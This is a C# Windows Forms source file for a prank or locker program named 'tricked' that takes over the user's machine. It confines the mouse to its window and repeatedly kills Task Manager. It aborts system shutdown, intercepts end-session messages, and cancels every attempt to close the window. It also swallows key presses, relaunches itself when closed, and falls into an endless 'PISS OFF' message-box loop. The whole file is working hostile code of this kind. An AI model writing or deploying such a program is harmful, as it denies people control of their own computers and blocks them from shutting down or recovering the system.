using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.Runtime.InteropServices;

namespace trick
{
    public partial class tricked : Form
    {
        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool AbortSystemShutdown(string lpMachineName);
        int WM_QUERYENDSESSION = 17;
        int WM_CANCELMODE = 31;
     
        public tricked()
        {
            InitializeComponent();
        }


        private void tricked_Load(object sender, EventArgs e)
        {
            Cursor.Clip = this.DesktopBounds;
            timer1.Enabled = true;
            timer2.Enabled = true;
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            try
            {
                AbortSystemShutdown(null);
            }
            catch { }

            try
            {
                System.Diagnostics.Process.GetProcessesByName("taskmgr")[0].Close();
            }
            catch
            { }

            try
            {
                System.Diagnostics.Process.GetProcessesByName("taskmgr")[0].CloseMainWindow();
            }
            catch
            { }

            try
            {
                System.Diagnostics.Process.GetProcessesByName("taskmgr")[0].Kill();
            }
            catch
            { }

            Cursor.Clip = this.DesktopBounds;
            label1.Text = "I told you not to";
            this.WindowState = FormWindowState.Normal;
            this.Focus();
            this.ControlBox = false;
            this.TopMost = true;
            this.TopLevel = true;
            Activate();
            BringToFront();
            this.MaximizeBox = false;
            this.MinimizeBox = false;
        }

        private void tricked_KeyDown(object sender, KeyEventArgs e)
        {
            e.SuppressKeyPress = true;
            e.Handled = true;
          //  base.OnKeyDown(e);
        }

        protected override void WndProc(ref Message ex)
        {
            if ((ex.Msg == WM_QUERYENDSESSION))
            {
                Message MyMsg = new Message();
                MyMsg.Msg = WM_CANCELMODE;
                base.WndProc(ref MyMsg);
            }
            else
            {
                base.WndProc(ref ex);
            }
        }

        protected override void OnClosing(CancelEventArgs e)
        {
            e.Cancel = true;
            base.OnClosing(e);
        }

        private void tricked_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (e.CloseReason == CloseReason.WindowsShutDown || e.CloseReason == CloseReason.TaskManagerClosing)
            {
                mboxpiss();
                try
                { AbortSystemShutdown(null); }
                catch { }
            }
            e.Cancel = true;
            base.OnClosing(e);
        }

        private void tricked_FormClosed(object sender, FormClosedEventArgs e)
        {
            System.Diagnostics.Process.Start(Application.ExecutablePath);
            mboxpiss();
        }

        void mboxpiss()
        {
            while (1 == 1)
            {
                MessageBox.Show("PISS OFF", "PISS OFF", MessageBoxButtons.OK);
            }
        }

        private void timer2_Tick(object sender, EventArgs e)
        {
            if (this.Size.Height > 10 && this.Size.Width > 10)
                this.Size = new Size(this.Size.Width - 1, this.Size.Height - 1);
            else
                timer2.Stop();
        }
    }
}
